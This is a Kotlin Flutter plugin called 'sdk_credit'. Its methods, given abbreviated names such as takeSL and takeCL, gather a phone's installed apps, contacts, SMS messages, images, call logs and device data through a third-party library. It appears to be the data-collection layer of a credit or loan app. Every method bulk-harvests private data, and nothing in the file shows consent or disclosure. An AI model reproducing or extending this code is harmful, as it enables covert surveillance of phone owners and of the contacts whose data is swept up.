package com.mynico.sdk_credit

import android.app.Activity
import androidx.annotation.NonNull
import io.flutter.embedding.engine.plugins.FlutterPlugin
import io.flutter.embedding.engine.plugins.activity.ActivityAware
import io.flutter.embedding.engine.plugins.activity.ActivityPluginBinding
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.MethodChannel.MethodCallHandler
import io.flutter.plugin.common.MethodChannel.Result
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import com.gc.timesdklib.utils.DeUtils
import com.gc.timesdklib.utils.AllManager
import com.gc.timesdklib.utils.EventListener
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext


/** WSdk22Plugin */
class SdkPlugin : FlutterPlugin, MethodCallHandler, ActivityAware {
    /// The MethodChannel that will the communication between Flutter and native Android
    ///
    /// This local reference serves to register the plugin with the Flutter Engine and unregister it
    /// when the Flutter Engine is detached from the Activity
    private lateinit var channel: MethodChannel
    private var mContext: Activity? = null

    override fun onAttachedToEngine(@NonNull flutterPluginBinding: FlutterPlugin.FlutterPluginBinding) {
        channel = MethodChannel(flutterPluginBinding.binaryMessenger, "sdk_credit")
        channel.setMethodCallHandler(this)
    }

    override fun onMethodCall(@NonNull call: MethodCall, @NonNull result: Result) {
        runBlocking {
            if (call.method == "takeAL") {
                val values = withContext(Dispatchers.IO) {
                    AllManager.getAppInfo(mContext!!, object: EventListener {
                        override fun event(event: String) {
                        }
                    })
                }
                result.success(values)
            } else if (call.method == "takeCL") {
                val values = withContext(Dispatchers.IO) {
                    AllManager.getContact(mContext!!, object : EventListener {
                        override fun event(event: String) {
                        }
                    })
                }
                result.success(values)
            } else if (call.method == "takeDI") {
                val values = withContext(Dispatchers.IO) {
                    DeUtils.getDeviceData(mContext!!, object : EventListener {
                        override fun event(event: String) {
                        }
                    })
                }
                result.success(values)
            } else if (call.method == "takeSL") {
                val values = withContext(Dispatchers.IO) {
                    AllManager.getSmsInfo(mContext!!, object : EventListener {
                        override fun event(event: String) {
                        }
                    })
                }
                result.success(values)
            } else if (call.method == "takePL") {
                val values = withContext(Dispatchers.IO) {
                    AllManager.getImgInfo(mContext!!, object : EventListener {
                        override fun event(event: String) {
                        }
                    })
                }
                result.success(values)
            } else if (call.method == "takeCI") {
                val values = withContext(Dispatchers.IO) {
                    AllManager.getCall(mContext!!, object : EventListener {
                        override fun event(event: String) {
                        }
                    })
                }
                result.success(values)
            } else {
                result.notImplemented()
            }
        }
    }

    override fun onDetachedFromEngine(@NonNull binding: FlutterPlugin.FlutterPluginBinding) {
        channel.setMethodCallHandler(null)
    }

    override fun onAttachedToActivity(binding: ActivityPluginBinding) {
        mContext = binding.activity
    }

    override fun onDetachedFromActivityForConfigChanges() {
      onDetachedFromActivity()
    }

    override fun onReattachedToActivityForConfigChanges(binding: ActivityPluginBinding) {
        onAttachedToActivity(binding)
    }

    override fun onDetachedFromActivity() {
      mContext = null
    }
}
